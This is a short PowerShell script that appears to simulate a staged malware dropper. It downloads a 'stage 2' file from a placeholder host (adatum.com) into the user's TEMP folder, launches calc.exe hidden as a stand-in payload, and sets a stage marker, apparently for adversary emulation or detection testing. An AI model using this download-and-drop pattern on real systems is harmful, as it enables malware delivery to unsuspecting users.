[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://adatum.com/assets/update.dat',
    [string]$DropPath = "$env:TEMP\update.dat"
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $DropPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$StageMarker = "stage-24"
